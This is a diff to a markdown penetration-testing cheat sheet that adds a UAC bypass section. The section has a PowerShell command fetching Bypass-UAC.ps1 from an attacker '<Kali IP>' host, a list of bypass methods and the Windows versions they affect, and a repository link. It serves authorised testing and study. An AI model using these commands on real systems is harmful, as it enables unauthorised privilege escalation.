@@ -163,6 +163,28 @@ Import-Module C:\Temp\PowerUp\PowerUp.ps1
 Invoke-AllChecks
 ```
 
+### Bypass-UAC
+
+- HTTP
+
+```powershell
+Invoke-WebRequest -Uri 'http://<Kali IP>/Bypass-UAC.ps1' -OutFile <Path>\Bypass-UAC.ps1
+Import-Module <Path>\Bypass-UAC.ps1
+Get-Help Bypass-UAC
+```
+
+```powershell
+#-------------------#
+# Supported Methods #
+#-------------------#
+
++ UacMethodSysprep: x32/x64 Win7-Win8
++ ucmDismMethod: x64 Win7+ (unpatched, tested up to 10RS2 14926)
++ UacMethodMMC2: x64 Win7+ (unpatched, tested up to 10RS2 14926)
++ UacMethodTcmsetup: x32/x64 Win7-10 (UAC "0day" A_\_(aƒ,)_/A_)
++ UacMethodNetOle32: x32/x64 Win7-10 (UAC "0day" A_\_(aƒ,)_/A_)
+```
+
 ## Links
 
 - [Basic Linux privilege escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
@@ -175,3 +197,4 @@ Invoke-AllChecks
 - [Windows - blog- uac-bypass](https://juggernaut-sec.com/uac-bypass/)
 - [Windows - how uac-bypass work](https://cqureacademy.com/cqure-labs/cqlabs-how-uac-bypass-methods-really-work-by-adrian-denkiewicz)
 - [Windows - UACMe - uac-bypass](https://github.com/hfiref0x/UACME)
+- [Windows - UAC - Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)
